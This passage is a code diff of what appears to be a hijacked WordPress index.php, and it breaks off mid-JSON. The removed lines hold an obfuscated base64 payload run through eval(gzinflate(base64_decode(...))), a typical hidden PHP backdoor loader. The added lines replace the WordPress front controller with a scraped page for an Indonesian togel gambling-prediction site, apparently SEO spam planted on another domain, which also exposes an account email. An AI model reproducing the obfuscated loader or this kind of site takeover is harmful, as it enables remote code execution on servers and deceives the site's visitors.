637Fdsf2LDvz7/lif2USuRWNSNP/yEf2yPn4\x42vLu1HJ76r/4Zhn\x2b2FDWf44r\x42fU6Wvj\x612035YwP6z\x63G7\x2b/ZgrdN\x62tswp\x62e502pW7y7UXzXwmfN\x43OGrXK/rDJY004tYPHs\x62E8ux82PE0Svs\x61GEV2ROWoDYIGwsIiS3Inzzx\x41Z0LT7plP\x41hK\x63g5NoM\x62s6RjHWT\x43\x61qd711F7o5OM8j4wpzK1ley3f\x63yoP29Z7\x2bkljd6texd6uTtxQ/0xf\x2bpHeT/7JtIhXXSGlWvMiPjyeuNjHsl\x63mP\x42\x618rQUvk5DuM4SP/G3\x2beh788\x61NXrO\x63NV\x424GvFq1\x41/H43kS/tymS/pv\x41gWQY0lknGx\x61dG\x62\x42D\x61u\x2bRwh7Ho\x42qsW4inWdDL94QUvhUXGVYmx7wwOnD\x2bN2xXv1Z\x41\x62Dz\x61Xk\x42JKPZUmsGZqhWs33Frr2uOz/rYxte2kTnOvYi0yL/0z/V0jDO\x42fu1ZUQNJlfTKOVNi\x61u\x632VQkIWGXrG/vDUd2081K\x61uWuzO/3lkkPGu0n148730wZ61mW3ZH7rk9\x43iMV\x63\x62dF\x62IvIO\x42l\x41Gfi1\x425SZMiKkfRZzTEr7t6VjQvGGiRhMEX9HjkmuvI\x62EYe7Dr\x41d\x62q\x41vD0S\x63\x627KM\x2b70jUFsxEn\x2bIP3ZkOW\x43QgsIx7Wm1r\x61MYLfitnooJORJ/p4UWsGHzfJEqoOMe\x43GZz\x61NIEp2xsm8pzg\x2b7L8MRZZmi\x61JzRprGR\x43\x42jFJLi\x63mDx\x2b\x41\x4323PnXO4dGsVEIRpJsys6\x41OhkF87ykQj\x2bwWwhv\x63X\x2bd\x630ELZXiZ\x61tqo/njzWrj\x63iEI\x63l\x619WGG9dHShQjwE3\x2beSMGwO\x42SGMN2F\x43r6HiRjwiGiudgngzpnt1RjYI2fh0QyOZtuV3QOi\x2bp\x43fvQkvY2989ez6K9\x2b1\x63\x61W6O5fOsL\x427Om\x627S0Pj8D4Ypd3mvTVjNPudnyUQpF\x43ilGQOE7tW3UXKeqIfVTiktRteKn/F5Tv8/y\x61SFinz\x42ILF6j3wZXn\x63KPhG0eTME\x632/pY8Vr7NnoNoV3Ywu33M6IZp7D2Y\x41P2z0z1/SYzogu5R\x41PpduX\x62yZXq4HP0eF\x63W84mip\x62iXy0Xz\x2bGj1hwPq7P/5vf\x41p0QX\x639NDR0sKS6OpkgSs\x63KggD8DJ/\x61gMwR8hMhT358g\x41sDY\x63WGdFMITQSDFg1\x41JUs5IYFR2pTlVuSTV0X/kx7otZN\x61H4Shf\x2bgZ\x62YqnSXDgmsZfnJ7FnufjDHVO/2DONsX\x41IiDLH\x63Hhk2MIJTLrZ\x62\x63\x62dJlnm/pLslPDX\x2bQIJiKd\x41hs7TZY6wkjQVV3Oi\x62dhwhU\x435zmiFFwojJVkUSJI1\x61\x43hI38j\x43SDnWSJlKTwpR96rIQ5eOrlpDeoISZmZn/9xjppYpvRRv\x43PQ\x61f\x41/t\x63nF7zsdfgu\x414KT7gnXLPltUoVFFiWIz8t\x42LEXp\x63ep0XkuxrRgz\x62txsLq6RUnVMHZdv9fe9/9dfL8s3\x62rK4jv\x63MWzl8moqm3/p1zH/xH/Kns/QJ9I\x63xFv86v/N2\x61P1QJHf/\x63/O/nYeXjP\x629D8N28\x42OfJI2XeT5zfjLrO\x2b\x42\x2b\x63itP0\x43s\x2bz\x42\x41\x42iuV\x43p\x62qU5yjIFmwPwezGf7dpRJJIER4NxjERze5jNR\x2biSw2\x61FdfFD\x2bGrLnj\x637JvWvuRLL\x62Pvvw\x2b1dmv4\x62\x62x2X\x2b\x63j0n\x63PVRfmm8EVpG9ez\x61273ze\x622ud\x622ud\x622ud\x62x\x2b\x2bWtZ72t9IpQzEMsO1mNxJexyuTTEQsn7EG\x42wJexytTjEQsX7EK\x42wJexysTzEQsH7EO\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+  <!doctype html>
+  <html xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml" lang="en-US"
+    data-authenticated-account>
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <base href="https://soonews.ca/">
+    <meta charset="utf-8" />
+    <title>ROKOKBET # Link Prediksi Togel HK Akurat & Syair HK Jitu Dan Bocoran HK Hari Ini</title>
+    <meta http-equiv="Accept-CH" content="Sec-CH-UA-Platform-Version, Sec-CH-UA-Model" />
+    <link rel="icon" type="image/x-icon" href="https://res.cloudinary.com/dqkin28uq/image/upload/v1727884650/favicon_0_hgvvxf.png" />
+    <link rel="amphtml" href="https://pub-2d2e6a1aab644d4a81b155ff1a0ebbb3.r2.dev/httpssoonews.caAMP.-2.html" />
+    <link rel="canonical" href="https://soonews.ca/" />
+    <meta property="og:site_name" content="ROKOKBET" />
+    <meta property="og:title" content="ROKOKBET # Link Prediksi Togel HK Akurat & Syair HK Jitu Dan Bocoran HK Hari Ini" />
+    <meta property="og:url" content="https://soonews.ca/" />
+    <meta property="og:type" content="product" />
+    <meta property="og:description" content="Prediksi ROKOKBET adalah penyedia bocoran angka hk dan syair angka hk yang sangat jitu dan akurat dalam menyediakan 2D 3D 4D yang terlengkap di setiap pasaran togelnya." />
+    <meta property="og:image" content="https://res.cloudinary.com/dqkin28uq/image/upload/v1731518613/Untitled-1_o1bmkf.jpg" />
+    <meta property="og:image:width" content="840" />
+    <meta property="og:image:height" content="480" />
+    <meta property="product:price:amount" content="111.00" />
+    <meta property="product:price:currency" content="IDR" />
+    <meta property="product:availability" content="instock" />
+    <meta itemprop="name" content="ROKOKBET # Link Prediksi Togel HK Akurat & Syair HK Jitu Dan Bocoran HK Hari Ini" />
+    <meta itemprop="url" content="https://soonews.ca/" />
+    <meta itemprop="description" content="Prediksi ROKOKBET adalah penyedia bocoran angka hk dan syair angka hk yang sangat jitu dan akurat dalam menyediakan 2D 3D 4D yang terlengkap di setiap pasaran togelnya." />
+    <meta itemprop="thumbnailUrl" content="https://res.cloudinary.com/dqkin28uq/image/upload/v1731518613/Untitled-1_o1bmkf.jpg" />
+    <link rel="image_src" href="https://res.cloudinary.com/dqkin28uq/image/upload/v1731518613/Untitled-1_o1bmkf.jpg" />
+    <meta itemprop="image" content="https://res.cloudinary.com/dqkin28uq/image/upload/v1731518613/Untitled-1_o1bmkf.jpg" />
+    <meta name="twitter:title" content="ROKOKBET # Link Prediksi Togel HK Akurat & Syair HK Jitu Dan Bocoran HK Hari Ini" />
+    <meta name="twitter:image" content="https://res.cloudinary.com/dqkin28uq/image/upload/v1731518613/Untitled-1_o1bmkf.jpg" />
+    <meta name="twitter:url" content="https://soonews.ca/" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="google-site-verification" content="MlzyBEwQ36iJlBIFNyijvz0GTCuPYbdAmcLYan_c8r8" />
+    <meta name="twitter:description" content="Prediksi ROKOKBET adalah penyedia bocoran angka hk dan syair angka hk yang sangat jitu dan akurat dalam menyediakan 2D 3D 4D yang terlengkap di setiap pasaran togelnya." />
+    <meta name="description" content="Prediksi ROKOKBET adalah penyedia bocoran angka hk dan syair angka hk yang sangat jitu dan akurat dalam menyediakan 2D 3D 4D yang terlengkap di setiap pasaran togelnya." />
+    <link rel="preconnect" href="https://images.squarespace-cdn.com">
+    <script type="text/javascript" src="//use.typekit.net/ik/YBu34tnxV4Qnak-NQdXM8x5qF7OcRbDshoILwz0AU8Jfe7CgfFHN4UJLFRbh52jhWDjuZcb3ZRqtwAmRwR9oFeFR5eZyw2Ia5gGMJ6lzS1gGZWmDOWgkdkJPjAszjc9lZhBkjAuzdcblSY4zH6GJE_tgIMMjgfMfH6GJujXfIMMjgPMfH6GJEdtgIMMjgkMfH6GJEntgIMMj2KMfH6qJvDbbMs6IJMJ7fbR3FgMgeMS6MKG4fVJXIMIj2KMfH6qJvQbbMs6sJMHbMZcLNHve.js"></script>
+    <script type="text/javascript">try { Typekit.load(); } catch (e) { }</script>
+    <script type="text/javascript" crossorigin="anonymous" defer="defer" nomodule="nomodule" src="//assets.squarespace.com/@sqs/polyfiller/1.6/legacy.js"></script>
+    <script type="text/javascript" crossorigin="anonymous" defer="defer" src="//assets.squarespace.com/@sqs/polyfiller/1.6/modern.js"></script>
+    <script type="text/javascript">SQUARESPACE_ROLLUPS = {};</script>
+    <script>(function (rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/extract-css-runtime-901b92ac6382aa506e2c-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-extract_css_runtime');</script>
+    
+    <script>(function (rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/extract-css-moment-js-vendor-6f117db4eb7fd4392375-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-extract_css_moment_js_vendor');</script>
 
-?>
-<?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
+    <script>(function (rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/cldr-resource-pack-1edcdb1d4b6b94ec8c7e-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-cldr_resource_pack');</script>
+  
+    <script>(function (rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-vendors-stable-98890d5c030fb474ba6c-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common_vendors_stable');</script>
 
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
+    <script>(function (rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-vendors-7a98df8511da483159d9-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common_vendors');</script>
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+    <script>(function (rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-6ba49635395d7a3ea6d0-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common');</script>
+
+    <script>(function (rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/commerce-debf953cca7d88c08601-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-commerce');</script>
+  
+    <script>(function (rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].css = ["//assets.squarespace.com/universal/styles-compressed/commerce-2af06f7948db5477d8f5-min.en-US.css"]; })(SQUARESPACE_ROLLUPS, 'squarespace-commerce');</script>
+    <link rel="stylesheet" type="text/css"
+      href="//assets.squarespace.com/universal/styles-compressed/commerce-2af06f7948db5477d8f5-min.en-US.css">
+    <script
+      data-name="static-context">Static = window.Static || {}; Static.SQUARESPACE_CONTEXT = { "facebookAppId": "314192535267336", "facebookApiVersion": "v6.0", "rollups": { "squarespace-announcement-bar": { "js": "//assets.squarespace.com/universal/scripts-compressed/announcement-bar-2ddc1e1b63fb01508663-min.en-US.js" }, "squarespace-audio-player": { "css": "//assets.squarespace.com/universal/styles-compressed/audio-player-9fb16b1675c0ff315dae-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/audio-player-52e7797854645a8049b0-min.en-US.js" }, "squarespace-blog-collection-list": { "css": "//assets.squarespace.com/universal/styles-compressed/blog-collection-list-0106e2d3707028a62a85-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/blog-collection-list-1e390bbcde22c7bbc97f-min.en-US.js" }, "squarespace-calendar-block-renderer": { "css": "//assets.squarespace.com/universal/styles-compressed/calendar-block-renderer-0e361398b7723c9dc63e-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/calendar-block-renderer-b7f7ef044f34ab60f440-min.en-US.js" }, "squarespace-chartjs-helpers": { "css": "//assets.squarespace.com/universal/styles-compressed/chartjs-helpers-e1c09c17d776634c0edc-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/chartjs-helpers-183bb56124237b096402-min.en-US.js" }, "squarespace-comments": { "css": "//assets.squarespace.com/universal/styles-compressed/comments-24b74a0326eae0cd5049-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/comments-57aaa7e0d8bb4318a484-min.en-US.js" }, "squarespace-custom-css-popup": { "css": "//assets.squarespace.com/universal/styles-compressed/custom-css-popup-26d04dbeb2734b75ab66-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/custom-css-popup-c382f88a8b4030eaba9e-min.en-US.js" }, "squarespace-dialog": { "css": "//assets.squarespace.com/universal/styles-compressed/dialog-081be79078914b908a1a-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/dialog-220dee7ab3c67003a735-min.en-US.js" }, "squarespace-events-collection": { "css": "//assets.squarespace.com/universal/styles-compressed/events-collection-0e361398b7723c9dc63e-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/events-collection-5e7e2c69c45256595707-min.en-US.js" }, "squarespace-form-rendering-utils": { "js": "//assets.squarespace.com/universal/scripts-compressed/form-rendering-utils-ff99e57a9b46f1df69cb-min.en-US.js" }, "squarespace-forms": { "css": "//assets.squarespace.com/universal/styles-compressed/forms-8d93ba2c12ff0765b64c-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/forms-d654c3315c889be0f1a5-min.en-US.js" }, "squarespace-gallery-collection-list": { "css": "//assets.squarespace.com/universal/styles-compressed/gallery-collection-list-0106e2d3707028a62a85-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/gallery-collection-list-5f8358cf7b510b32fc49-min.en-US.js" }, "squarespace-image-zoom": { "css": "//assets.squarespace.com/universal/styles-compressed/image-zoom-0106e2d3707028a62a85-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/image-zoom-d0c90be829ba36cb62cc-min.en-US.js" }, "squarespace-pinterest": { "css": "//assets.squarespace.com/universal/styles-compressed/pinterest-0106e2d3707028a62a85-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/pinterest-a6dbcb964bd882c42ef0-min.en-US.js" }, "squarespace-popup-overlay": { "css": "//assets.squarespace.com/universal/styles-compressed/popup-overlay-b2bf7df4402e207cd72c-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/popup-overlay-ce3ac44a00dabe47927e-min.en-US.js" }, "squarespace-product-quick-view": { "css": "//assets.squarespace.com/universal/styles-compressed/product-quick-view-4aec27f1bd826750e9db-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/product-quick-view-f9b8478c52e3b704a64f-min.en-US.js" }, "squarespace-products-collection-item-v2": { "css": "//assets.squarespace.com/universal/styles-compressed/products-collection-item-v2-0106e2d3707028a62a85-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/products-collection-item-v2-a96b3f54dd47a01900f6-min.en-US.js" }, "squarespace-products-collection-list-v2": { "css": "//assets.squarespace.com/universal/styles-compressed/products-collection-list-v2-0106e2d3707028a62a85-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/products-collection-list-v2-0c340509add53a698500-min.en-US.js" }, "squarespace-search-page": { "css": "//assets.squarespace.com/universal/styles-compressed/search-page-dcc0462e30efbd6dc562-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/search-page-03ccda685ca48569888b-min.en-US.js" }, "squarespace-search-preview": { "js": "//assets.squarespace.com/universal/scripts-compressed/search-preview-6cd27bde4d88d4f26743-min.en-US.js" }, "squarespace-simple-liking": { "css": "//assets.squarespace.com/universal/styles-compressed/simple-liking-a9eb87c1b73b199ce387-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/simple-liking-6a6862d5ff0df1b9784e-min.en-US.js" }, "squarespace-social-buttons": { "css": "//assets.squarespace.com/universal/styles-compressed/social-buttons-98ee3a678d356d849b76-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/social-buttons-4e176f98e042b90d7db4-min.en-US.js" }, "squarespace-tourdates": { "css": "//assets.squarespace.com/universal/styles-compressed/tourdates-0106e2d3707028a62a85-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/tourdates-463b5b9532edddc3565e-min.en-US.js" }, "squarespace-website-overlays-manager": { "css": "//assets.squarespace.com/universal/styles-compressed/website-overlays-manager-6dfb472f441e39d78b13-min.en-US.css", "js": "//assets.squarespace.com/universal/scripts-compressed/website-overlays-manager-cbf06aa21f2440307e01-min.en-US.js" } }, "pageType": 50, "website": { "id": "65fd0f981ec2594cc8fa0178", "identifier": "flamingo-elk-f2ll", "websiteType": 1, "contentModifiedOn": 1711083626706, "cloneable": false, "hasBeenCloneable": false, "siteStatus": { "value": 3, "expiration": 1712293016383 }, "language": "en-US", "timeZone": "Asia/Jakarta", "machineTimeZoneOffset": 25200000, "timeZoneOffset": 25200000, "timeZoneAbbr": "WIB", "siteTitle": "ROKOKBET", "fullSiteTitle": "ROKOKBET # Link Prediksi Togel HK Akurat & Syair HK Jitu Dan Bocoran HK Hari Ini \u2014 ROKOKBET", "siteDescription": { "html": "", "raw": false }, "logoImageId": "65fd10a47559c83021e276b0", "shareButtonOptions": { "1": true, "3": true, "4": true, "6": true, "8": true, "7": true, "2": true }, "logoImageUrl": "https://res.cloudinary.com/dqkin28uq/image/upload/v1728160488/rokokbet-logo_0_odxbog.png", "authenticUrl": "https://soonews.ca/", "internalUrl": "https://soonews.ca/", "baseUrl": "https://soonews.ca/", "sslSetting": 3, "isHstsEnabled": true, "createdOn": 1711083416383, "templateId": "5c5a519771c10ba3470d8101", "installationId": "65fd0f981ec2594cc8fa0180", "templateWebsiteId": "624b3c6dfa94ce68f1db3837", "hasPassword": false, "typekitId": "", "statsMigrated": false, "imageMetadataProcessingEnabled": false, "revalidateBefore": 1711083687852, "captchaSettings": { "enabledForDonations": false }, "showOwnerLogin": true }, "websiteSettings": { "id": "65fd0f981ec2594cc8fa017b", "websiteId": "65fd0f981ec2594cc8fa0178", "subjects": [], "country": "ID", "state": "JK", "simpleLikingEnabled": true, "mobileInfoBarSettings": { "isContactEmailEnabled": false, "isContactPhoneNumberEnabled": false, "isLocationEnabled": false, "isBusinessHoursEnabled": false }, "commentLikesAllowed": true, "commentAnonAllowed": true, "commentThreaded": true, "commentApprovalRequired": false, "commentAvatarsOn": true, "commentSortType": 2, "commentFlagThreshold": 0, "commentFlagsAllowed": true, "commentEnableByDefault": true, "commentDisableAfterDaysDefault": 0, "disqusShortname": "", "commentsEnabled": false, "storeSettings": { "returnPolicy": { "raw": false }, "termsOfService": { "raw": false }, "privacyPolicy": { "raw": false }, "storeMailingList": { "connected": false, "list": "", "useSingleOptIn": false }, "expressCheckout": false, "continueShoppingLinkUrl": "/", "testModeOn": true, "useLightCart": false, "showNoteField": false, "shippingCountryDefaultValue": "US", "billToShippingDefaultValue": false, "showShippingPhoneNumber": true, "isShippingPhoneRequired": false, "showBillingPhoneNumber": true, "isBillingPhoneRequired": false, "currenciesSupported": ["USD", "CAD", "GBP", "AUD", "EUR", "CHF", "NOK", "SEK", "DKK", "NZD", "SGD", "MXN", "HKD", "CZK", "ILS", "MYR", "RUB", "PHP", "PLN", "THB", "BRL", "ARS", "COP", "IDR", "INR", "JPY", "ZAR"], "defaultCurrency": "USD", "selectedCurrency": "IDR", "measurementStandard": 1, "showCustomCheckoutForm": false, "checkoutPageMarketingOptInEnabled": true, "enableMailingListOptInByDefault": false, "isApplePayEnabled": false, "isPaymentRequestEnabled": true, "sameAsRetailLocation": false, "merchandisingSettings": { "scarcityEnabledOnProductItems": false, "scarcityEnabledOnProductBlocks": false, "scarcityMessageType": "DEFAULT_SCARCITY_MESSAGE", "scarcityThreshold": 10, "merchantLowStockAlertThreshold": 5, "multipleQuantityAllowedForServices": true, "restockNotificationsEnabled": false, "restockNotificationsMailingListSignUpEnabled": false, "relatedProductsEnabled": false, "relatedProductsOrdering": "random", "soldOutVariantsDropdownDisabled": false, "productComposerOptedIn": false, "productComposerABTestOptedOut": false, "productReviewsEnabled": false }, "minimumOrderSubtotalEnabled": false, "minimumOrderSubtotal": { "currency": "IDR", "value": "0.00" }, "instagramShoppingLinkDestination": 1, "storeMigratedToProductCollections2_0": false, "isLive": false, "multipleQuantityAllowedForServices": true }, "useEscapeKeyToLogin": false, "ssBadgeType": 1, "ssBadgePosition": 4, "ssBadgeVisibility": 1, "ssBadgeDevices": 1, "pinterestOverlayOptions": { "mode": "disabled" }, "ampEnabled": false, "userAccountsSettings": { "loginAllowed": false, "signupAllowed": false } }, "cookieSettings": { "isCookieBannerEnabled": false, "isRestrictiveCookiePolicyEnabled": false, "isRestrictiveCookiePolicyAbsolute": false, "cookieBannerText": "", "cookieBannerTheme": "", "cookieBannerVariant": "", "cookieBannerPosition": "", "cookieBannerCtaVariant": "", "cookieBannerCtaText": "", "cookieBannerAcceptType": "OPT_IN", "cookieBannerOptOutCtaText": "", "cookieBannerHasOptOut": false, "cookieBannerHasManageCookies": true, "cookieBannerManageCookiesLabel": "" }, "websiteCloneable": false, "collection": { "title": "Store", "id": "65fd0fc2aa1d0858f5af2fe4", "fullUrl": "/store", "type": 13, "permissionType": 1 }, "item": { "title": "ROKOKBET # Link Prediksi Togel HK Akurat & Syair HK Jitu Dan Bocoran HK Hari Ini", "id": "65fd0fc7db01f63c712f258e", "fullUrl": "/store/p/zeus", "publicCommentCount": 0, "commentState": 1, "recordType": 11 }, "subscribed": false, "appDomain": "squarespace.com", "templateTweakable": true, "tweakJSON": { "form-use-theme-colors": "false", "header-logo-height": "50px", "header-mobile-logo-max-height": "30px", "header-vert-padding": "2vw", "header-width": "Inset", "maxPageWidth": "1800px", "pagePadding": "3vw", "tweak-blog-alternating-side-by-side-image-aspect-ratio": "1:1 Square", "tweak-blog-alternating-side-by-side-image-spacing": "6%", "tweak-blog-alternating-side-by-side-meta-spacing": "20px", "tweak-blog-alternating-side-by-side-primary-meta": "Categories", "tweak-blog-alternating-side-by-side-read-more-spacing": "20px", "tweak-blog-alternating-side-by-side-secondary-meta": "Date", "tweak-blog-basic-grid-columns": "2", "tweak-blog-basic-grid-image-aspect-ratio": "3:2 Standard", "tweak-blog-basic-grid-image-spacing": "50px", "tweak-blog-basic-grid-meta-spacing": "37px", "tweak-blog-basic-grid-primary-meta": "Categories", "tweak-blog-basic-grid-read-more-spacing": "37px", "tweak-blog-basic-grid-secondary-meta": "Date", "tweak-blog-item-custom-width": "50", "tweak-blog-item-show-author-profile": "true", "tweak-blog-item-width": "Medium", "tweak-blog-masonry-columns": "2", "tweak-blog-masonry-horizontal-spacing": "30px", "tweak-blog-masonry-image-spacing": "20px", "tweak-blog-masonry-meta-spacing": "20px", "tweak-blog-masonry-primary-meta": "Categories", "tweak-blog-masonry-read-more-spacing": "20px", "tweak-blog-masonry-secondary-meta": "Date", "tweak-blog-masonry-vertical-spacing": "30px", "tweak-blog-side-by-side-image-aspect-ratio": "1:1 Square", "tweak-blog-side-by-side-image-spacing": "6%", "tweak-blog-side-by-side-meta-spacing": "20px", "tweak-blog-side-by-side-primary-meta": "Categories", "tweak-blog-side-by-side-read-more-spacing": "20px", "tweak-blog-side-by-side-secondary-meta": "Date", "tweak-blog-single-column-image-spacing": "50px", "tweak-blog-single-column-meta-spacing": "30px", "tweak-blog-single-column-primary-meta": "Categories", "tweak-blog-single-column-read-more-spacing": "30px", "tweak-blog-single-column-secondary-meta": "Date", "tweak-events-stacked-show-thumbnails": "true", "tweak-events-stacked-thumbnail-size": "3:2 Standard", "tweak-fixed-header": "true", "tweak-fixed-header-style": "Basic", "tweak-global-animations-animation-curve": "ease", "tweak-global-animations-animation-delay": "1.0s", "tweak-global-animations-animation-duration": "0.80s", "tweak-global-animations-animation-style": "fade", "tweak-global-animations-animation-type": "none", "tweak-global-animations-complexity-level": "detailed", "tweak-global-animations-enabled": "false", "tweak-portfolio-grid-basic-custom-height": "50", "tweak-portfolio-grid-overlay-custom-height": "50", "tweak-portfolio-hover-follow-acceleration": "10%", "tweak-portfolio-hover-follow-animation-duration": "Medium", "tweak-portfolio-hover-follow-animation-type": "Fade", "tweak-portfolio-hover-follow-delimiter": "Forward Slash", "tweak-portfolio-hover-follow-front": "false", "tweak-portfolio-hover-follow-layout": "Inline", "tweak-portfolio-hover-follow-size": "75", "tweak-portfolio-hover-follow-text-spacing-x": "1.5", "tweak-portfolio-hover-follow-text-spacing-y": "1.5", "tweak-portfolio-hover-static-animation-duration": "Medium", "tweak-portfolio-hover-static-animation-type": "Scale Up", "tweak-portfolio-hover-static-delimiter": "Forward Slash", "tweak-portfolio-hover-static-front": "false", "tweak-portfolio-hover-static-layout": "Stacked", "tweak-portfolio-hover-static-size": "75", "tweak-portfolio-hover-static-text-spacing-x": "1.5", "tweak-portfolio-hover-static-text-spacing-y": "1.5", "tweak-portfolio-index-background-animation-duration": "Medium", "tweak-portfolio-index-background-animation-type": "Fade", "tweak-portfolio-index-background-custom-height": "50", "tweak-portfolio-index-background-delimiter": "None", "tweak-portfolio-index-background-height": "Large", "tweak-portfolio-index-background-horizontal-alignment": "Center", "tweak-portfolio-index-background-link-format": "Stacked", "tweak-portfolio-index-background-persist": "false", "tweak-portfolio-index-background-vertical-alignment": "Middle", "tweak-portfolio-index-background-width": "Full", "tweak-product-basic-item-click-action": "None", "tweak-product-basic-item-gallery-aspect-ratio": "2:3 Standard (Vertical)", "tweak-product-basic-item-gallery-design": "Slideshow", "tweak-product-basic-item-gallery-width": "44%", "tweak-product-basic-item-hover-action": "None", "tweak-product-basic-item-image-spacing": "10vw", "tweak-product-basic-item-image-zoom-factor": "3", "tweak-product-basic-item-product-variant-display": "Button", "tweak-product-basic-item-thumbnail-placement": "Side", "tweak-product-basic-item-variant-picker-layout": "Dropdowns", "tweak-products-add-to-cart-button": "false", "tweak-products-columns": "3", "tweak-products-gutter-column": "10vw", "tweak-products-gutter-row": "3vw", "tweak-products-header-text-alignment": "Middle", "tweak-products-image-aspect-ratio": "3:4 Three-Four (Vertical)", "tweak-products-image-text-spacing": "1.5vw", "tweak-products-mobile-columns": "2", "tweak-products-text-alignment": "Middle", "tweak-products-width": "Inset", "tweak-transparent-header": "true" }, "templateId": "5c5a519771c10ba3470d8101", "templateVersion": "7.1", "pageFeatures": [1, 2, 4], "gmRenderKey": "QUl6YVN5Q0JUUk9xNkx1dkZfSUUxcjQ2LVQ0QWVUU1YtMGQ3bXk4", "templateScriptsRootUrl": "https://static1.squarespace.com/static/vta/5c5a519771c10ba3470d8101/scripts/", "betaFeatureFlags": ["content_ai_brand_identity", "campaigns_thumbnail_layout", "blog_monetization", "unify_edit_mode_p2", "hideable_header_footer_for_videos", "send_local_pickup_ready_email", "visitor_react_forms", "toggle_preview_new_shortcut", "commsplat_forms_visitor_profile", "viewer-role-contributor-invites", "website_form_effects", "header_usability_improvements", "commerce_checkout_website_updates_enabled", "fluid_engine_clean_up_grid_contextual_change", "fluid_engine_default_mobile_order", "commerce_clearpay", "summary_block_video_collections", "commerce_order_status_access", "customer_accounts_email_verification", "campaigns_discount_section_in_blasts", "unify_edit_mode_p1", "enable_css_variable_tweaks", "website_fonts", "background_art_onboarding", "campaigns_new_image_layout_picker", "supports_versioned_template_assets", "commerce_site_visitor_metrics", "google_consent_v2", "pdp_product_add_ons_visitor_site", "react_pages_panel", "rte_text_justify_align", "commerce_restock_notifications", "rewrite_transactional_email_from_address", "hide_header_footer_beta", "customer_account_creation_recaptcha", "seven_one_migration_updated_kb_links", "show_mobile_column_in_plp_editor", "template_translation_english_fallbacks", "shape_block", "hideable_header_footer_for_courses", "commerce_etsy_shipping_import", "is_feature_gate_refresh_enabled", "themes", "website_form_improvements", "marketing_landing_page", "invoicing-on-personal-plans", "campaigns_import_discounts", "commerce_etsy_product_import", "campaigns_global_uc_ab", "sticky_scroll", "collection_typename_switching", "override_block_styles", "scripts_defer", "nested_categories", "link_editor_redesign", "member_areas_feature", "fluid_engine", "campaigns_discount_section_in_automations", "accounting_orders_sync", "nested_categories_migration_enabled", "proposals_beta_in_circle_labs", "commerce_paywall_renewal_notifications", "new_stacked_index", "rte_text_highlights", "unify_edit_mode_p1_70", "container_styles_improvements", "fluid_engine_new_multiselect_actions", "commerce_subscription_renewal_notifications"], "videoAssetsFeatureFlags": ["mux-data-video-collection", "mux-data-course-collection"], "authenticatedAccount": { "id": "65c59c43aeb76a63df61000a", "tutorialsCompleted": { "has-seen-fluid-engine-mobile-changes-notification": true }, "notificationsRead": {}, "lastLoginOn": 1710053561233, "displayName": "situs toto togel 4D", "firstName": "Togel", "lastName": "Online", "eligibleForMarketingDiscount": false, "avatarUrl": "https://images.squarespace-cdn.com/content/v2/namespaces/memberAccountAvatars/libraries/65c59c43aeb76a63df61000a/eebe3831-3821-41a9-8818-bd08e148e29c/thirdPartyMemberAvatar-65c59c43aeb76a63df61000a-8626ef63-73bb-4e8a-9246-0b0e8a72310a?format=300w", "bio": "", "roles": {}, "email": "primahengkiki@gmail.com", "createdOn": 1707449411357, "marketingId": "8a89b7bf-913e-404f-8ced-d1dde4b91061", "avatarAssetUrl": 